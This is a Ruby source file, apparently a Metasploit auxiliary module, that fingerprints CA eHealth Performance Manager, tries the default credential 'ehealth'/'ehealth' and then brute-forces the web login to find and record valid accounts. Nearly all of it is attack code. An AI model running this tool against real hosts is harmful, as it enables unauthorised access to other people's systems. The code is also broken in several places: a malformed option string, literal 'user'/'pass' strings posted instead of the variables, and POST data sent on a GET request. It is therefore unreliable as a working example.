##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'
require 'nokogiri'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'CA eHealth Performance Manager application version enumeration and brute force login Utility',
			'Description'    => %{
				This module attempts to scan for CA eHealth Performance Manager web application, finds its version
			and performs login brute force to identify valid credentials.
			},
			'Author'         =>
				[
					'KarnGaneshen[at]gmail.com',
				],
			'Version'	 => '1.0',
			'License'        => MSF_LICENSE
		))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('URI', [true, "URI for CA eHealth Web login. Default is /web/frames/", "/web/
frames/"]))
			], self.class)
	end

	def run_host(ip)
		if not is_app_ehealth?
			print_error("Application does not appear to be CA eHealth. Module will not continue.")
			return
		end

		status = try_default_credential
		return if status == :abort

		print_status("Brute-forcing...")
		each_user_pass do |user, pass|
			do_login(user, pass)
		end
	end

	#
	# What's the point of running this module if the app actually isn't eHealth?
	#
	def is_app_ehealth?

			res = send_request_cgi(
                        {
                                'uri'       => '/bin/welcome.sh',
                                'method'    => 'GET'
                        })

			check_key = "Welcome to the CA <i>e</i>Health<sup><font size=4>&reg"

			if (res and res.code.to_i == 200 and res.body.match(check_key) != nil)
				doc = Nokogiri::HTML( res.body )
				verKey = doc.at_css("title").text
				print_good("Application version is #{verKey}")
				success = true
			end
	end

	#
	# Test and see if the default credential works
	#
	def try_default_credential
		user = 'ehealth'
		pass = 'ehealth'
		do_login(user, pass) if user and pass
	end

	#
	# Brute-force the login page
	#
	def do_login(user, pass)
		vprint_status("Trying username:'#{user}' with password:'#{pass}'")
		begin
			res = send_request_cgi(
			{
				'uri'       => datastore['URI'],
				'method'    => 'GET',
				'vars_post' =>
					{
						'username' => 'user',
						'password' => 'pass'
					}
			})

			doc = Nokogiri::HTML( res.body )
			key = doc.at_css("title").text

			if (not doc or key != "eHealth [#{user}]")
				vprint_error("FAILED LOGIN. '#{user}' : '#{pass}' with code #{res.code}")
				return :skip_pass
			else
				print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

				report_hash = {
					:host   => datastore['RHOST'],
					:port   => datastore['RPORT'],
					:sname  => 'eHealth',
					:user   => user,
					:pass   => pass,
					:active => true,
					:type => 'password'}

				report_auth_info(report_hash)
				return :next_user
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		       res = false
		rescue ::Timeout::Error, ::Errno::EPIPE

		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error("HTTP Connection Failed, Aborting")
			return :abort
		end
	end

end
